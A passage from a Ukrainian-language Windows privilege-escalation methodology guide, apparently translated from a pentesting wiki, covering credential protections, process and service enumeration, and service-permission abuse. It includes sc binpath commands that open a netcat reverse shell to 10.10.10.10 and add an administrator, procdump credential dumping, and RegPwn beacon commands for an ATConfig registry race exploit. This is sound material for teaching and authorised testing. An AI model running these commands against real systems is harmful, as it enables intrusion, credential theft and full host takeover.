Ці налаштування визначають, що **журналюється**, тож на них варто звернути увагу.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — корисно знати, куди надсилаються журнали.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** призначено для **керування паролями локального адміністратора**: воно забезпечує, щоб на комп’ютерах, приєднаних до домену, кожен пароль був **унікальним, випадковим і регулярно оновлювався**. Ці паролі надійно зберігаються в Active Directory, і доступ до них мають лише користувачі, яким надано достатні дозволи через ACLs, що дає їм змогу переглядати паролі локального адміністратора за наявності відповідних прав.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо функцію активовано, **паролі у відкритому тексті зберігаються в LSASS** (Local Security Authority Subsystem Service).\
[**Докладніше про WDigest на цій сторінці**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Захист LSA

Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист Local Security Authority (LSA), щоб **блокувати** спроби ненадійних процесів **читати її пам’ять** або впроваджувати код, додатково захищаючи систему.\
[**Більше інформації про захист LSA тут**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** було представлено у **Windows 10**. Його призначення — захищати облікові дані, що зберігаються на пристрої, від таких загроз, як атаки pass-the-hash. [**Більше інформації про Credential Guard можна знайти тут.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Кешовані облікові дані

**Облікові дані домену** автентифікуються **Local Security Authority** (LSA) і використовуються компонентами операційної системи. Коли дані входу користувача автентифікуються зареєстрованим пакетом безпеки, для користувача зазвичай створюються облікові дані домену.\
[**Докладніше про кешовані облікові дані тут**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Користувачі та групи

### Перелік користувачів і груп

Перевірте, чи мають якісь групи, до яких ви належите, цікаві дозволи.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Привілейовані групи

Якщо ви **належите до привілейованої групи, то можете підвищити свої привілеї**. Дізнайтеся більше про привілейовані групи та про те, як зловживати ними для підвищення привілеїв:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Маніпуляції з токенами

**Дізнайтеся більше** про те, що таке **токен**, на цій сторінці: [**Токени Windows**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Перегляньте наступну сторінку, щоб **дізнатися про цікаві токени** та про те, як зловживати ними:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Користувачі, що ввійшли в систему / Сеанси

```bash
qwinsta
klist sessions
```

### Домашні папки

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Політика паролів

```bash
net accounts
```

### Отримати вміст буфера обміну

```bash
powershell -command "Get-Clipboard"
```

## Запущені процеси

### Дозволи на файли та папки

Перш за все, під час перегляду списку процесів **перевірте, чи немає паролів у командному рядку процесу**.\
Перевірте, чи можете **перезаписати якийсь запущений бінарний файл** або чи маєте права на запис у папку з бінарним файлом, щоб скористатися можливими [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Завжди перевіряйте, чи не запущені [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md): їх можна використати для підвищення привілеїв.

Debugger listener може працювати недовго, тому його відсутність в одному пасивному знімку портів не доводить, що він ніколи не був відкритий. Зіставляйте виявлений listener із його PID, власником процесу та можливістю користувача з нижчими привілеями підключитися до нього; сама назва програми або debug flag не підтверджує можливість виконання коду між користувачами. Під час звичайного збору даних обмежуйтеся пасивною перевіркою, не надсилаючи debugger-команди.

**Перевірка прав доступу до бінарних файлів процесів**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Перевірка дозволів папок із бінарними файлами процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Каталоги динамічних препроцесорів Snort

Snort 2 може завантажувати спільні бібліотеки з каталогу `dynamicpreprocessor directory`, зазначеного в конфігурації, вибраній за допомогою `snort.exe -c <config>`. Якщо заплановане завдання або служба запускає Snort від імені іншого облікового запису, перевірте саме цю конфігурацію та ACL каталогу модулів, указаного в ній. Якщо ваш токен дає змогу створювати там файли, цей шлях варто перевірити на можливість виконання коду під час наступного завантаження модулів завданням або службою. Перевірте ефективні привілеї облікового запису запуску, активну конфігурацію, сумісність модулів, а також обмеження заборони чи спільного доступу; сам факт можливості запису в каталог не доводить наявність підвищення привілеїв. У [документації Snort щодо динамічних препроцесорів](https://www.snort.org/documents/dpx-readme) описано завантаження модулів під час виконання.

### Привілейована вебслужба з доступним для запису коренем документів

В інсталяції Apache на Windows порівняйте шлях до виконуваного файла служби та обліковий запис запуску зі значенням `DocumentRoot` в активному файлі `httpd.conf`. Для типового розташування XAMPP перевірте `C:\xampp\apache\conf\httpd.conf` і ACL налаштованого кореня документів, яким часто є `C:\xampp\htdocs`. Якщо користувач із нижчими привілеями може створювати файли в цьому корені, а Apache працює від імені `LocalSystem`, виконання коду на сервері може перетнути межу привілеїв хоста. Переконайтеся, що служба працює, що вона обслуговує саме цей шлях і що обробник на сервері обробляє цей тип файлів; можливість запису в корінь сама по собі доводить лише можливість створювати файли. Перевірте ACL, не створюючи пробного файла:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Для стандартної інсталяції WAMP служба може посилатися на версійну версію `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (або `C:\wamp\...` для 32-бітної конфігурації), а конфігурація розташовуватися поруч у `conf\httpd.conf`, із кореневим каталогом за замовчуванням `C:\wamp64\www` або `C:\wamp\www`. Перевірте точний образ служби, обліковий запис, від імені якого вона працює, фактичний `DocumentRoot` (включно з розгортанням `${INSTALL_DIR}` і перевизначеннями віртуальних хостів), а також ACL кореневого каталогу. Доступність для запису каталогу WAMP сама по собі не доводить, що Apache працює як `SYSTEM` або виконує надісланий файл. [В документації Apache описано, як служба Windows вибирає конфігурацію](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Доступний для запису кореневий каталог IIS та мережева ідентичність пулу застосунків

Для IIS зіставте фізичний каталог, доступний для запису, з **активним сайтом/застосунком** у `applicationHost.config`, а потім визначте налаштований для нього пул і обробник на сервері. Код, розміщений у каталозі, що обслуговується, виконується від імені пулу лише за умови, що IIS обробляє цей тип файлів і маршрут доступний. Перш ніж вважати каталог доступним для виконання коду, перевірте ефективні права поточного користувача на створення файлів, стан сайту під час виконання, обробник і перевизначення для відповідного шляху.

Динамічна компіляція ASP.NET створює окремий шлях для перевірки: згенеровані файли в каталозі компіляції застосунку. Типово це каталог `Temporary ASP.NET Files` у відповідній інсталяції .NET Framework, але параметр `<compilation tempDirectory>` застосунку може його змінити. [Microsoft описує розташування та підкаталоги для окремих застосунків](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) і [рекомендує ізолювати каталоги компіляції, якщо пули застосунків не довіряють один одному](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Якщо токен користувача з нижчими привілеями дає змогу змінювати згенерований вихідний код у кеші **конкретного** застосунку, з’ясуйте, чи перекомпілює цей застосунок його з ідентичністю [робочого процесу](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) з вищими привілеями. Самі лише ACL файлу чи каталогу не доводять можливість виконання коду: зіставте кеш з активним застосунком, ефективним токеном і ACL, параметрами компіляції, ідентичністю процесу та часом будь-якої перекомпіляції. Використовуйте лише перегляд метаданих; під час переліку не запускайте компіляцію й не змінюйте файли кешу.

Пул IIS, налаштований як `ApplicationPoolIdentity` або `NetworkService`, зазвичай автентифікується до доменних ресурсів як **обліковий запис комп’ютера-хоста**, хоча його локальний токен може мати низькі привілеї. `LocalSystem` уже має високі локальні привілеї та також використовує в мережі обліковий запис комп’ютера; `LocalService` зазвичай використовує анонімні облікові дані мережі. Пул `SpecificUser` використовує натомість налаштований для нього обліковий запис. [Microsoft описує ці типи ідентичностей](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) і [мережеву ідентичність пулу застосунків](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Якщо параметр ідентичності не вказано, можуть застосовуватися типові параметри пулу, що відрізняються залежно від покоління IIS; тому визначте ефективну конфігурацію, а не робіть припущення за назвою пулу. Якщо виконання коду відбувається в пулі з мережевою ідентичністю облікового запису комп’ютера, оцініть права **саме цього комп’ютера** в домені. Для [DCSync](../active-directory-methodology/dcsync.md) потрібні права реплікації в контексті іменування домену; квиток облікового запису комп’ютера або роль хоста самі по собі їх не доводять. Під час пасивного переліку перевіряйте конфігурацію та ACL, не завантажуючи файли, не виконуючи мережеву автентифікацію й не запитуючи квитки.

Для доступного для читання обробника ASP.NET, який запускає допоміжний процес, простежте шлях будь-якого значення, отриманого із запиту, через автентифікацію, розшифрування, перевірку та формування команди. Обробник, що конкатенує декодований токен у `ProcessStartInfo("cmd", "/c ...")`, може дозволити метасимволам оболонки змінити команду; [Microsoft описує спеціальні символи `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Переконайтеся, що недовірений викликач справді може вплинути на декодоване значення та звернутися до обробника, а потім визначте ефективну ідентичність пулу застосунків або імперсоновану ідентичність і ідентичність дочірнього процесу. Рядок у доступному для читання вихідному коді, слухач на localhost або слабкість формату токена самі по собі не доводять можливість виконання команд із підвищеними привілеями. Переглядайте вихідний код і конфігурацію пулу, не надсилаючи підроблених запитів і не запускаючи допоміжний процес під час пасивного переліку.

Для служби PHP у Windows шлях, контрольований запитом і переданий до [`include` або `require`](https://www.php.net/manual/en/function.include.php), може призвести до виконання PHP-файлу, доступного для запису користувачу з нижчими привілеями, від імені робочого процесу. Переконайтеся, що запит може дійти до цього оператора, визначений шлях вказує на файл, який користувач із нижчими привілеями може змінити, а робочий процес — прочитати, відповідні обмеження шляхів PHP дозволяють підключення, а сам робочий процес справді має вищі привілеї. Слухач на loopback-інтерфейсі або файл, доступний для запису, самі по собі не підтверджують цей ланцюжок; під час пасивного переліку перевірте вихідний код, ідентичність служби та ACL файлів, не викликаючи кінцеву точку.

### Пошук паролів у пам’яті

За допомогою **procdump** із Sysinternals можна створити дамп пам’яті запущеного процесу. Такі служби, як FTP, зберігають **облікові дані в пам’яті у відкритому вигляді**; спробуйте зняти дамп пам’яті та прочитати облікові дані.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Незахищені GUI-програми

**Програми, запущені від SYSTEM, можуть дозволити користувачу запустити CMD або переглядати каталоги.**

Приклад: «Довідка та підтримка Windows» (Windows + F1): знайдіть «command prompt» і натисніть «Click to open Command Prompt».

### Імпорт файлів проєктів із підвищеними привілеями

Програма, яка автоматично відкриває проєкти з каталогу для скидання, доступного для запису користувачу з нижчими привілеями, перетинає межу довіри до вхідних даних від імені облікового запису імпортера. Перевірте **точний шлях, доступний для запису**, процес або завдання, яке його відкриває, його ефективну ідентичність і версію парсера. [Історична проблема Ghidra з відкриттям/відновленням проєкту](https://github.com/NationalSecurityAgency/ghidra/issues/71) дозволяла використовувати зовнішні сутності XML у метаданих проєкту; мережева сутність у Windows могла спричинити автентифікацію від імені облікового запису імпортера, якщо це дозволяли [політики вихідного SMB і NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). Це може свідчити про витік облікових даних, але не дає негайного доступу адміністратора: отриману відповідь потрібно використати через окремий авторизований або вразливий шлях, а поточні збірки слід перевірити з урахуванням фактичного стану виправлень. Не відкривайте спеціально сформований проєкт під час пасивної розвідки; перевірте процес імпорту та ACL.

## Служби

Право [`SC_MANAGER_CREATE_SERVICE` об'єкта Service Control Manager (SCM)](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) відрізняється від прав на наявну службу. Успішний запит лише на читання [`OpenSCManager` для отримання доступу](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) із цим правом є приводом для перевірки, але не доказом того, що нову службу можна запустити. [`CreateService` повертає дескриптор](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) із правами доступу до служби, запитаними під час її створення; повторне відкриття служби згодом виконує окрему перевірку доступу й може завершитися невдало, навіть якщо можна було скористатися початковим дескриптором. Окремо перевірте ефективний локальний або віддалений токен, надані права дескриптора, обліковий запис служби, політику запуску та шлях до виконуваного файлу. Не створюйте й не запускайте службу під час пасивної розвідки.

Для віддаленого шляху встановлення служби зіставте ці права SCM зі спільним ресурсом на цільовій системі, до якого може записувати **той самий мережевий обліковий запис**, базовим ACL NTFS цього ресурсу та локальним шляхом до виконуваного файлу, який може запускати обліковий запис служби. Обліковий запис без прав адміністратора може перетнути цю межу, якщо існують незвично широкі права SCM і можливість розміщення файлу; адміністративний спільний ресурс не є обов'язковою умовою. Сам по собі доступ на запис до спільного ресурсу або право створення служби в SCM не доводять, що нова служба зможе запуститися з вищими привілеями.

Наявна служба може викликати допоміжний виконуваний файл під час запуску, зупинки або іншої події життєвого циклу, навіть якщо його немає в `ImagePath`. Якщо ім'я допоміжного файлу розв'язується в каталог, доступний для запису користувачу з нижчими привілеями, а служба запущена з вищими привілеями, відсутній файл може стати умовною ціллю для підміни. Підтвердьте **фактичний код служби або задокументований виклик допоміжної програми**, розв'язаний шлях до виконуваного файлу та порядок пошуку, права на створення каталогу, ідентичність служби й наявність доступного тригера життєвого циклу. Каталог служби, доступний для запису, або відсутній файл самі по собі не доводять, що служба завантажить цей файл; під час пасивної перевірки не запускайте й не зупиняйте службу.

Для наявної служби [`SERVICE_START` дозволяє передавати аргументи до `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); це право відрізняється від [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Перш ніж вважати право запуску чимось більшим за право керування, перевірте код служби або задокументований інтерфейс. Якщо вона використовує аргумент, вибраний викликачем, як шлях для журналу чи експорту, перевірте ідентичність служби, точний зв'язок між аргументом і записом у файл, обмеження шляхів і дозволи для **створеного файлу**. Запис у захищений каталог може стати підвищенням привілеїв лише за наявності окремого привілейованого споживача або завантажувача, який приймає цей файл; самого лише журналу, доступного для запису, або права запуску недостатньо. Під час пасивної інвентаризації не запускайте службу й не створюйте тестовий файл.

Для агента моніторингу NSClient++ файл `nsclient.ini`, доступний для читання, є **приводом перевірити конфігурацію**: у ньому можуть зберігатися облікові дані вебінтерфейсу, а `boot.ini` може перенаправляти конфігурацію в інше місце. Перевірте фактичний обліковий запис служби, вебслухач і політику доступу, а також те, чи може автентифікована роль змінювати налаштування або скрипти. Для привілейованого виконання додатково потрібні `CheckExternalScripts` (або інший увімкнений шлях виконання), чинне право реєструвати або змінювати команду та тригер, який запускає її від імені служби. Слухач, прив'язаний лише до loopback, усе одно може бути доступним локальному користувачу, але самі лише шлях до файлу, пароль або слухач не підтверджують наявності таких прав. Під час пасивної розвідки перевіряйте метадані й дозволи, не показуючи секретів і не викликаючи веб API. Див. [структуру файлів NSClient++](https://nsclient.org/docs/concepts/file-layout/), [рекомендації щодо захисту вебінтерфейсу та скриптів](https://nsclient.org/docs/setup/securing/) і [налаштування зовнішніх скриптів](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Якщо `ImagePath` служби вказує на `nssm.exe`, перевірте фактичний обліковий запис, від імені якого запускається служба, і значення `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM зберігає там дочірню програму](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), тоді як `AppDirectory` — це налаштований робочий каталог. Перш ніж вважати дозволи обгортки повним описом межі безпеки служби, перевірте дочірній виконуваний файл і ACL батьківських каталогів. Локальна кінцева точка WCF або SOAP, яку відкриває ця дочірня програма, є окремим приводом для перевірки: підтвердьте, що кінцева точка доступна користувачу з нижчими привілеями, конкретна операція приймає його вхідні дані, а дочірня служба виконує небезпечну операцію з вищими привілеями. Обліковий запис служби, URL кінцевої точки або шлях, доступний для запису, самі по собі не доводять можливість підвищення привілеїв; під час пасивної розвідки не викликайте операції служби.

Для спеціальної операції WCF простежте, чи потрапляє рядок, контрольований викликачем, у будь-який runspace PowerShell. [`Pipeline.Commands.AddScript` додає текст скрипту](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), а [`Pipeline.Invoke` запускає конвеєр](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` з обліковими даними транспортного рівня Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) автентифікує клієнта, але дозвіл викликати **саме цю** операцію та ефективну ідентичність runspace потрібно перевіряти окремо. Шлях від вхідних даних викликувача з нижчими привілеями до `AddScript`, що виконується від імені служби з вищими привілеями, є межею виконання коду; порт, що прослуховується, автентифікований клієнт або невикористовуваний метод у непов'язаній збірці самі по собі нічого не доводять. Під час розвідки статично перевірте розгорнуту службу, контракт, авторизацію та параметри імперсонації, не викликаючи кінцеву точку.

Тригери служб дають Windows змогу запускати службу за певних умов (активність іменованого каналу або кінцевої точки RPC, події ETW, доступність IP, підключення пристрою, оновлення GPO тощо). Навіть без прав SERVICE_START часто можна запускати привілейовані служби, активуючи їхні тригери. Методи переліку та активації наведено тут:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Служба збору діагностичних даних Visual Studio

До складу інсталяцій Visual Studio з інструментами C/C++ може входити `VSStandardCollectorService150` — служба діагностики, налаштована на запуск від імені `LocalSystem`. У [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) використовували junction і race condition із посиланням диспетчера об'єктів, щоб перенаправити скидання DACL служби. Для продемонстрованого підвищення привілеїв також був потрібен доступний шлях відновлення MSI через Visual Studio Setup WMI Provider і ціль `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Компонент виправили в січні 2024 року.

Для пасивної перевірки з'ясуйте обліковий запис і шлях до бінарного файлу саме цієї служби, перевірте наявність шляху до компілятора Setup WMI та статус виправлень установленого компонента. Запис служби, версія продукту Visual Studio або файл компілятора самі по собі не доводять, що система вразлива. Для перевірки не потрібно запускати службу або виконувати відновлення.

Отримати список служб:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Дозволи

Можна використовувати **sc**, щоб отримати інформацію про службу.

```bash
sc qc <service_name>
```

Рекомендується мати бінарний файл **accesschk** від _Sysinternals_, щоб перевірити необхідний рівень привілеїв для кожної служби.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Рекомендується перевірити, чи можуть «Authenticated Users» змінювати будь-яку службу:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Завантажити accesschk.exe для XP можна тут](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнення служби

Якщо у вас виникає така помилка (наприклад, із SSDPSRV):

_Сталася системна помилка 1058._\
_Не вдалося запустити службу: її вимкнено або з нею не пов’язано жодного ввімкненого пристрою._

Її можна ввімкнути за допомогою

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Враховуйте, що служба upnphost залежить від SSDPSRV (для XP SP1)**

**Інший спосіб обійти** цю проблему — виконати:

```
sc.exe config usosvc start= auto
```

### **Зміна шляху до бінарного файлу служби**

Якщо група «Authenticated users» має дозвіл **SERVICE_ALL_ACCESS** для служби, можна змінити її виконуваний бінарний файл. Щоб змінити й виконати **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Перезапуск служби

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Привілеї можна підвищити завдяки різним дозволам:

- **SERVICE_CHANGE_CONFIG**: Дозволяє змінювати конфігурацію бінарного файлу служби.
- **WRITE_DAC**: Дозволяє змінювати дозволи, що дає змогу змінювати конфігурацію служби.
- **WRITE_OWNER**: Дозволяє отримати право власності та змінювати дозволи.
- **GENERIC_WRITE**: Надає успадковану можливість змінювати конфігурацію служби.
- **GENERIC_ALL**: Також надає успадковану можливість змінювати конфігурацію служби.

Для виявлення та експлуатації цієї вразливості можна скористатися _exploit/windows/local/service_permissions_.

### Слабкі дозволи на бінарні файли служб

Якщо служба працює від імені **`LocalSystem`**, **`LocalService`**, **`NetworkService`** або привілейованого доменного облікового запису, але **користувачі з низькими привілеями можуть змінювати EXE-файл служби або його батьківську папку**, службу часто можна перехопити, **замінивши бінарний файл і перезапустивши службу**.

**Перевірте, чи можете ви змінити бінарний файл, який запускає служба**, або чи маєте **дозволи на запис до папки**, де розташований бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Щоб отримати список усіх бінарних файлів, які запускаються службами, використовуйте **wmic** (не в system32), а щоб перевірити дозволи, скористайтеся **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Також можна використовувати **sc** та **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Шукайте небезпечні ACL, надані **`Everyone`**, **`BUILTIN\Users`** або **`Authenticated Users`**, особливо **`(F)`**, **`(M)`** або **`(W)`** для виконуваного файла служби чи каталогу, у якому він міститься. Практична схема зловживання:<sup>[[27]](#references)</sup>

1. Перевірте обліковий запис служби та шлях до виконуваного файла за допомогою `sc qc <service_name>`.
2. Перевірте, чи можна записувати у двійковий файл, за допомогою `icacls <path>`.
3. Замініть двійковий файл служби на payload або дійсний шкідливий двійковий файл служби.
4. Перезапустіть службу за допомогою `sc stop <service_name> && sc start <service_name>` (або дочекайтеся перезавантаження чи спрацювання тригера служби).

Корисні автоматизовані перевірки:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Якщо служба не дозволяє звичайному користувачу перезапустити її, перевірте, чи запускається вона автоматично під час завантаження, чи має дію при збої, яка повторно її запускає, або чи можна опосередковано запустити її через програму, яка її використовує.

### Дозволи на зміну реєстру служб

Перевірте, чи можете ви змінити реєстр будь-якої служби.\
Ви можете **перевірити** свої **дозволи** на **реєстр** служби, виконавши:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Початкову перевірку дозволів було сформульовано так:

Потрібно перевірити, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи `FullControl`. Якщо так, можна змінити бінарний файл, який запускає служба.

Перевірте, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи на запис до ключа реєстру конкретної служби. Сам запис ACL не доводить, що доступ фактично є: важливі записи заборони, поточний токен і успадковані дозволи. Права на ключ реєстру відрізняються від прав `SERVICE_CHANGE_CONFIG` і `SERVICE_START` для об’єкта служби. Для ескалації також потрібне придатне для використання поле конфігурації служби, спосіб її запустити та обліковий запис служби з вищими привілеями. Див. [права на ключ реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) від Microsoft і [довідник із прав доступу до служб](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Щоб змінити Path бінарного файлу, який запускається:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Гонка symlink у реєстрі для запису довільного значення HKLM (ATConfig)

Деякі функції спеціальних можливостей Windows створюють ключі **ATConfig** для кожного користувача, які згодом копіюються процесом **SYSTEM** до ключа сеансу HKLM. Гонка з **символічним посиланням** у реєстрі може перенаправити цей привілейований запис до **будь-якого шляху HKLM**, надаючи примітив **запису довільного значення** HKLM.<sup>[[18]](#references)</sup>

Розташування ключів (приклад: Екранна клавіатура `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` містить перелік установлених функцій спеціальних можливостей.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` зберігає конфігурацію, контрольовану користувачем.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` створюється під час входу або переходу до захищеного робочого столу й доступний для запису користувачу.

Сценарій зловживання (CVE-2026-24291 / ATConfig):

1. Задайте значення **HKCU ATConfig**, яке потрібно записати від імені SYSTEM.
2. Запустіть копіювання до захищеного робочого столу (наприклад, **LockWorkstation**), що запускає потік брокера AT.
3. **Виграйте гонку**, встановивши **oplock** на `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; коли спрацює oplock, замініть ключ **HKLM Session ATConfig** на **посилання реєстру** на захищений цільовий ключ HKLM.
4. SYSTEM запише вибране атакувальником значення за перенаправленим шляхом HKLM.

Отримавши можливість записувати довільні значення HKLM, перейдіть до LPE, перезаписавши значення конфігурації служб:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/командний рядок)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Виберіть службу, яку може запустити звичайний користувач (наприклад, **`msiserver`**), і запустіть її після запису. **Примітка:** публічна реалізація експлойту **блокує робочу станцію** під час гонки.

Приклади інструментів (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Дозволи AppendData/AddSubdirectory для реєстру служб

Якщо у вас є цей дозвіл для розділу реєстру, це означає, що **ви можете створювати підрозділи реєстру в ньому**. У випадку служб Windows цього **достатньо, щоб виконати довільний код**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Шляхи до служб без лапок

Якщо шлях до виконуваного файлу не взято в лапки, Windows намагатиметься виконати кожен варіант шляху, що закінчується перед пробілом.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows намагатиметься виконати:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

